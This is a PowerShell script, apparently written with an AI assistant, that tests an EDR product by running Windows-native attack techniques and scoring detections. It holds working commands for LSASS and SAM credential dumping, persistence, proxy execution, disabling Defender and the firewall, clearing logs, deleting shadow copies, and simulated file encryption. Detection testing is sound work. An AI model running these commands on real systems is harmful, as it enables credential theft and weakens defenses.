<#
  native_redteam.ps1 -- the whole EDR evaluation with NOTHING to download.

  Every technique below runs with tools ALREADY on a stock Windows machine
  (powershell, cmd, reg, schtasks, sc, certutil, rundll32, regsvr32, mshta,
  wmic/CIM, net, netsh, vssadmin, wevtutil). No Atomic Red Team, no Sysmon, no
  procdump, no internet payloads. This is the "test like a real customer who
  installed Valkyrie and downloaded nothing" evaluation.

  It works because Valkyrie now turns on Windows' own process-creation auditing
  (Security 4688 + command line) and reads it -- so command-line detection is
  live out of the box. Confirm that first:  valkyrie --enable-native-audit  (as
  admin), or just let the installed service do it.

  For every technique it records ONE of three honest outcomes, never conflating
  them the way a raw run does:
     RAN + DETECTED   the command executed AND Valkyrie raised an incident
     RAN + MISSED     it executed and Valkyrie did NOT  -> a real miss
     DID-NOT-RUN      Windows itself blocked it (Smart App Control / policy /
                      missing tool) -> tells us nothing about Valkyrie

  SAFE by default. The genuinely destructive techniques (disable Defender,
  disable firewall, delete shadow copies, clear event logs, stop a service,
  ransomware simulation) run ONLY with  -IncludeDestructive , and each has a
  cleanup step. Snapshot the VM first anyway.

  Usage (elevated PowerShell, inside the throwaway VM):
     .\native_redteam.ps1                       # safe set
     .\native_redteam.ps1 -IncludeDestructive   # + the destructive set
#>

[CmdletBinding()]
param(
    [string]$Api = "http://127.0.0.1:8090",
    [int]$SettleSeconds = 6,
    [switch]$IncludeDestructive
)

$ErrorActionPreference = "Continue"
function Say($m, $c = "Gray") { Write-Host $m -ForegroundColor $c }

# --- API + incident diffing ------------------------------------------------
function Api-Json($path) {
    try { return (Invoke-WebRequest "$Api$path" -UseBasicParsing -TimeoutSec 6).Content | ConvertFrom-Json }
    catch { return $null }
}
function Incident-Ids {
    $j = Api-Json "/api/edr/incidents"
    if ($null -eq $j) { return @() }
    return @($j | ForEach-Object { $_.id })
}
function New-Incidents($known) {
    $j = Api-Json "/api/edr/incidents"
    if ($null -eq $j) { return @() }
    return @($j | Where-Object { $known -notcontains $_.id })
}
function Is-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    return ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
# Run a command line, return combined output text (so we can spot Windows blocks).
function Exec($cmdline) {
    try { return (cmd /c $cmdline 2>&1 | Out-String) } catch { return ($_ | Out-String) }
}

# --- Preflight -------------------------------------------------------------
Say "`n===============  Valkyrie native red-team (no downloads)  ===============" "Cyan"
if ($null -eq (Api-Json "/api/health")) {
    Say "STOP: Valkyrie API not answering on $Api. Is the app installed and running?" "Red"; exit 1
}
Say "Valkyrie API: UP" "Green"
$admin = Is-Admin
Say ("Elevated: " + $(if ($admin) {"YES"} else {"NO -- some Persistence/Credential tests will not run"})) `
    $(if ($admin) {"Green"} else {"Yellow"})

$audit = Api-Json "/api/telemetry/endpoint"   # best-effort; not required
# Prefer to confirm 4688 auditing directly:
$auditOn = $false
try {
    $ap = (auditpol /get /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" 2>&1 | Out-String)
    $reg = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -ErrorAction SilentlyContinue).ProcessCreationIncludeCmdLine_Enabled
    $auditOn = ($ap -match "Success") -and ($reg -eq 1)
} catch {}
if ($auditOn) { Say "Native process auditing (4688 + cmdline): ON  -- detection is live" "Green" }
else { Say "Native process auditing: OFF or unconfirmed. Run 'valkyrie --enable-native-audit' as admin, or command-line detections may miss." "Yellow" }

$stage = Join-Path $env:TEMP "valk_rt"
New-Item -ItemType Directory -Force -Path $stage | Out-Null

# --- Technique definitions -------------------------------------------------
# Each: Id, Tactic, Name, Destructive, NeedAdmin, Run (returns output text),
#       Cleanup (optional scriptblock).
$T = @()
function Tech($id,$tactic,$name,$run,$cleanup=$null,$destructive=$false,$admin=$false) {
    $script:T += [pscustomobject]@{ Id=$id; Tactic=$tactic; Name=$name; Run=$run;
        Cleanup=$cleanup; Destructive=$destructive; NeedAdmin=$admin }
}

# ---- Execution ----
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Process | Out-Null"))
Tech "T1059.001" "Execution" "Encoded PowerShell (hidden)" `
    { Exec "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $b64" }
Tech "T1059.003" "Execution" "cmd spawned chain" `
    { Exec 'cmd.exe /c "echo hi & whoami & hostname"' }
Tech "T1218.011" "Execution" "rundll32 proxy exec" `
    { Exec 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)' }
Tech "T1218.010" "Execution" "regsvr32 Squiblydoo" `
    { Exec 'regsvr32.exe /s /u /i:http://127.0.0.1:1/x.sct scrobj.dll' }
Tech "T1218.005" "Execution" "mshta remote" `
    { Exec 'mshta.exe http://127.0.0.1:1/x.hta' }
Tech "T1047" "Execution" "WMI process create" `
    { try { Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"} | Out-String } catch { Exec 'wmic process call create "calc.exe"' } } `
    { Get-Process calc -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue }

# ---- Persistence ----
Tech "T1053.005" "Persistence" "Scheduled task (onlogon)" `
    { Exec 'schtasks /create /tn ValkRT_Task /tr "C:\Windows\System32\calc.exe" /sc onlogon /f' } `
    { Exec 'schtasks /delete /tn ValkRT_Task /f' | Out-Null }
Tech "T1547.001" "Persistence" "Registry Run key" `
    { Exec 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ValkRT /t REG_SZ /d "C:\Windows\System32\calc.exe" /f' } `
    { Exec 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ValkRT /f' | Out-Null }
Tech "T1547.001b" "Persistence" "Startup-folder drop" `
    { $p = Join-Path ([Environment]::GetFolderPath('Startup')) "ValkRT.bat"
      "start calc.exe" | Out-File $p -Encoding ascii; "wrote $p" } `
    { Remove-Item (Join-Path ([Environment]::GetFolderPath('Startup')) "ValkRT.bat") -EA SilentlyContinue }
Tech "T1543.003" "Persistence" "Windows service create" `
    { Exec 'sc.exe create ValkRTSvc binPath= "C:\Windows\System32\calc.exe" start= demand' } `
    { Exec 'sc.exe delete ValkRTSvc' | Out-Null } $false $true

# ---- Defense Evasion ----
$b64d = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX 'Write-Output evil'"))
Tech "T1027" "Defense Evasion" "Obfuscated/encoded command" `
    { Exec "powershell.exe -nop -w hidden -enc $b64d" }
Tech "T1140" "Defense Evasion" "certutil decode payload" `
    { $b = Join-Path $stage "p.b64"; $o = Join-Path $stage "p.bin"
      [Convert]::ToBase64String([byte[]](1..32)) | Out-File $b -Encoding ascii
      Exec "certutil -decode `"$b`" `"$o`"" }

# ---- Credential Access ----
Tech "T1003.001" "Credential Access" "LSASS dump via comsvcs" `
    { $pid2 = (Get-Process lsass -EA SilentlyContinue).Id
      if (-not $pid2) { return "lsass not found" }
      Exec "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid2 $stage\lsass.dmp full" } `
    { Remove-Item "$stage\lsass.dmp" -EA SilentlyContinue } $false $true
Tech "T1003.002" "Credential Access" "SAM hive dump" `
    { Exec "reg save HKLM\SAM `"$stage\sam.save`" /y" } `
    { Remove-Item "$stage\sam.save" -EA SilentlyContinue } $false $true

# ---- Discovery ----
Tech "T1033" "Discovery" "whoami /priv"        { Exec "whoami /priv" }
Tech "T1082" "Discovery" "systeminfo"          { Exec "systeminfo" }
Tech "T1057" "Discovery" "tasklist"            { Exec "tasklist /v" }
Tech "T1087.001" "Discovery" "local accounts"  { Exec "net user" }
Tech "T1016" "Discovery" "network config"      { Exec "ipconfig /all" }
Tech "T1049" "Discovery" "network connections" { Exec "netstat -ano" }
Tech "T1018" "Discovery" "remote system recon" { Exec "net view & net group" }
Tech "T1482" "Discovery" "domain trust recon"  { Exec "nltest /domain_trusts" }

# ---- Command & Control ----
Tech "T1105" "Command and Control" "certutil download" `
    { Exec "certutil -urlcache -split -f http://127.0.0.1:1/x.txt `"$stage\x.txt`"" } `
    { Remove-Item "$stage\x.txt" -EA SilentlyContinue }
Tech "T1071.004" "Command and Control" "suspicious DNS lookup" `
    { Exec "nslookup malware-c2-test.example.com" }

# ---- Lateral Movement ----
Tech "T1021.002" "Lateral Movement" "SMB admin-share reach" `
    { Exec "net use \\127.0.0.1\C$ /persistent:no" } `
    { Exec "net use \\127.0.0.1\C$ /delete" | Out-Null }

# ---- Impact (DESTRUCTIVE) ----
Tech "T1489" "Impact" "Service stop" `
    { Exec "net stop Spooler" } `
    { Exec "net start Spooler" | Out-Null } $true $true
Tech "T1562.004" "Defense Evasion" "Disable Windows Firewall" `
    { Exec "netsh advfirewall set allprofiles state off" } `
    { Exec "netsh advfirewall set allprofiles state on" | Out-Null } $true $true
Tech "T1562.001" "Defense Evasion" "Disable Defender realtime" `
    { try { Set-MpPreference -DisableRealtimeMonitoring $true -EA Stop; "disabled realtime" } catch { "blocked: $_" } } `
    { try { Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue } catch {} } $true $true
Tech "T1070.001" "Defense Evasion" "Clear an event log" `
    { Exec "wevtutil cl `"Windows PowerShell`"" } $null $true $true
Tech "T1490" "Impact" "Delete shadow copies" `
    { Exec "vssadmin delete shadows /all /quiet" } $null $true $true
Tech "T1486" "Impact" "Ransomware-style bulk encrypt" `
    { $d = Join-Path $stage "docs"; New-Item -ItemType Directory -Force $d | Out-Null
      1..40 | ForEach-Object { "important data $_" | Out-File (Join-Path $d "file$_.txt") -Encoding ascii }
      Get-ChildItem $d | ForEach-Object {
        $b=[IO.File]::ReadAllBytes($_.FullName); for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor 0xAA}
        [IO.File]::WriteAllBytes($_.FullName+".locked",$b); Remove-Item $_.FullName }
      "encrypted 40 files" } `
    { Remove-Item (Join-Path $stage "docs") -Recurse -Force -EA SilentlyContinue } $true $false

# --- Run ------------------------------------------------------------------
$results = @()
foreach ($t in $T) {
    if ($t.Destructive -and -not $IncludeDestructive) { continue }
    Say ("`n--- {0,-11} {1,-18} {2}" -f $t.Id, $t.Tactic, $t.Name) "White"
    if ($t.NeedAdmin -and -not $admin) {
        Say "   SKIPPED -- needs admin, you are not elevated." "DarkGray"
        $results += [pscustomobject]@{ id=$t.Id; tactic=$t.Tactic; name=$t.Name; verdict="skipped-noadmin"; incidents=@() }
        continue
    }
    $before = Incident-Ids
    $out = ""
    try { $out = (& $t.Run) | Out-String } catch { $out = "$_" }

    $blocked = $false; $why = ""
    if ($out -match "Access is denied|denied|Access Denied") { $blocked=$true; $why="Windows blocked (Access denied)" }
    elseif ($out -match "disabled by your administrator")   { $blocked=$true; $why="blocked by policy" }
    elseif ($out -match "not recognized as an internal")    { $blocked=$true; $why="tool not present on this Windows" }

    Start-Sleep -Seconds $SettleSeconds
    $new = New-Incidents $before
    if ($t.Cleanup) { try { & $t.Cleanup } catch {} }

    if ($blocked) {
        Say ("   DID NOT RUN -- {0}" -f $why) "DarkGray"; $v="did-not-run"
    } elseif (@($new).Count -gt 0) {
        Say ("   RAN + DETECTED  ->  " + (($new | ForEach-Object { $_.title }) -join " | ")) "Green"; $v="detected"
    } else {
        Say "   RAN + MISSED -- executed, no Valkyrie incident." "Red"; $v="missed"
    }
    $results += [pscustomobject]@{ id=$t.Id; tactic=$t.Tactic; name=$t.Name; verdict=$v; note=$why;
        incidents=@($new | ForEach-Object { $_.title }) }
}

# --- Report ---------------------------------------------------------------
$ran = @($results | Where-Object { $_.verdict -in @("detected","missed") })
$det = @($results | Where-Object { $_.verdict -eq "detected" })
Say "`n==============================  RESULT  ==============================" "Cyan"
Say ("Executed (a real Valkyrie test)  : {0}" -f $ran.Count)
if ($ran.Count -gt 0) {
    Say ("Detected by Valkyrie             : {0} / {1}  ({2}%)" -f $det.Count, $ran.Count, [math]::Round(100*$det.Count/$ran.Count)) `
        $(if ($det.Count -eq $ran.Count) {"Green"} else {"Yellow"})
}
Say ("Blocked by Windows (not a result): {0}" -f @($results | Where-Object { $_.verdict -eq 'did-not-run' }).Count) "DarkGray"
Say ("Skipped (need admin)             : {0}" -f @($results | Where-Object { $_.verdict -eq 'skipped-noadmin' }).Count) "DarkGray"

Say "`nBy tactic (of the ones that executed):"
$ran | Group-Object tactic | Sort-Object Name | ForEach-Object {
    $d = @($_.Group | Where-Object { $_.verdict -eq "detected" }).Count
    Say ("  {0,-20} {1}/{2}" -f $_.Name, $d, $_.Count)
}
Say "`nPer technique:"
$results | ForEach-Object {
    $c = switch ($_.verdict) { "detected" {"Green"} "missed" {"Red"} default {"DarkGray"} }
    Say ("  {0,-11} {1,-18} {2,-30} {3}" -f $_.id, $_.tactic, $_.name, $_.verdict.ToUpper()) $c
}

$json = "$env:USERPROFILE\Desktop\valkyrie_redteam_result.json"
$results | ConvertTo-Json -Depth 5 | Out-File $json -Encoding utf8
Say "`nJSON report: $json" "Cyan"
Say "Paste the RESULT block back and I'll tell you what each miss means.`n" "Cyan"
